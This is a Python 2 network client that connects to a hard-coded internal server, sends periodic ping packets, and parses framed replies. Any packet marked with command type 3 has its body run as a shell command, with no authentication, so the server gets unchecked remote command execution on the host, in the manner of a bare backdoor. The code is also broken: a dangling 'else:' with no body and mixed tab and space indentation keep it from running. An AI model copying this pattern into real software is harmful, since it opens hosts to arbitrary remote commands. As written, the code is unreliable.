#coding=utf-8
import socket
import time
import logging
import json
import struct
import threading
from time import ctime,sleep
import Queue
import signal
import sys
import subprocess
import commands

myqueue = Queue.Queue(maxsize = 10)

logger = logging.getLogger("network-client")
logger.setLevel(logging.DEBUG)

fh = logging.FileHandler("network-client.log")
fh.setLevel(logging.DEBUG)
ch = logging.StreamHandler()
ch.setLevel(logging.ERROR)

formatter = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
ch.setFormatter(formatter)
fh.setFormatter(formatter)
logger.addHandler(fh)
logger.addHandler(ch)

i=0
SLEEPTYPE=0
VERSION=1
dataBuffer = None
headerSize = 12

def signal_handler(signum, frame):
    print('Received signal: ', signum)
    print('5 seconds exit this process.....')
    sleep(5)
    sys.exit()

def ping(sockerFd):
    global i
    #dataLen = None
    while True:
	header = [VERSION, ('ping'+str(i)).__len__(), SLEEPTYPE]
	headPack = struct.pack("!3I", *header)
        sendData = headPack+('ping'+str(i)).encode()
	try:
		#采用非阻塞插入数据，队列满了，退出（正常情况下队列不会满）
		myqueue.put(sendData,False)
	except Queue.Full:
		print "queue is full,exit......"
		return
		 
	'''
	try:
		dataLen = sockerFd.send(sendData)
	except socket.error, msg:
		print '-------  ',socket.error, msg
		return
        if dataLen != len(sendData):
            logger.error("send data to network server failed")
            return;
	'''
        sleep(2)
        i=i+1

def readFromSocket(socketFd):
    global dataBuffer
    while True:
	readData = socketFd.recv(1024)
	if not readData:
		print "no data received,exit......"
		return
        if dataBuffer == None:
		#print "dataBuffer None"
		dataBuffer = readData
	else:
		#print "dataBuffer not None"
		dataBuffer = dataBuffer+readData
	print 'dataBuffer: ',dataBuffer
	handlePack()

def handlePack():
    global dataBuffer
    if len(dataBuffer) < headerSize:
        print("数据包（%s Byte）小于包头长度，跳出小循环" % len(dataBuffer))
        return;
    headPack = struct.unpack('!3I', dataBuffer[:headerSize])
    bodySize = headPack[1]
    if len(dataBuffer) < headerSize+bodySize :
        print("数据包（%s Byte）不完整（总共%s Byte），跳出小循环" % (len(dataBuffer), headerSize+bodySize))
        return;
    body = dataBuffer[headerSize:headerSize+bodySize]
    dataHandle(body,headPack)
    dataBuffer=dataBuffer[headerSize+bodySize:]

def dataHandle(body,headPack):
    print("ver:%s, bodySize:%s, cmd:%s" % headPack)
    #print 'body:',body
    if headPack[2] == 3:
        print '-----------body: ',body
	'''
        p = subprocess.Popen(body, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)        
        for line in p.stdout.readlines():
            print 'line: ',line
	'''
	status, output = commands.getstatusoutput(body)
	print 'status: ',status,'output: ',output
	if status == 0:
	    header = [VERSION, ('ping'+str(i)).__len__(), SLEEPTYPE]
            headPack = struct.pack("!3I", *header)
            sendData = headPack+('ping'+str(i)).encode()
	else:
	
def writeToSocket(socketFd):
    while True:
        #从队列取数据，采用阻塞式
	pack = myqueue.get()
	sendLen = 0
	while True:
		try:
			sendLen += socketFd.send(pack[sendLen:])
		except socket.error, msg:
                	print '------- send msg error  ',socket.error, msg
                	return
                if sendLen == len(pack):
                        break

if __name__ == "__main__":
    try:
        connFd = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    except socket.error, msg:
        logger.error(msg)
    try:
        connFd.connect(("10.105.223.94", 2003))
        logger.debug("connect to network server success")
    except socket.error,msg:
        logger.error(msg)
    #connFd.setblocking(True)
    pingThread = threading.Thread(target=ping,args=(connFd,))
    pingThread.setDaemon(True)
    pingThread.start()
    readThread = threading.Thread(target=readFromSocket,args=(connFd,))
    readThread.setDaemon(True)
    readThread.start()
    writeThread = threading.Thread(target=writeToSocket,args=(connFd,))
    writeThread.setDaemon(True)
    writeThread.start()
    '''
    for i in range(1, 4):
        data = "hello wolrd"+str(i)
	ver = i
	cmd= i * i
	header = [ver, data.__len__(), cmd]
	headPack = struct.pack("!3I", *header)
	sendData = headPack+data[:2].encode()
        if connFd.send(sendData) != len(sendData):
            logger.error("send data to network server failed")
            break
	#time.sleep(4)
	#print "--------------",i,data,"-----------"
	connFd.send(data[2:].encode())
        readData = connFd.recv(1024)
        print readData
    '''	
    #time.sleep(1)
    #pingThread.join()
    #readThread.join()
    #writeThread.join()
    #connFd.close()
    signal.signal(15, signal_handler)
    print 'main thread start.........'
    while True:
        sleep(3600)
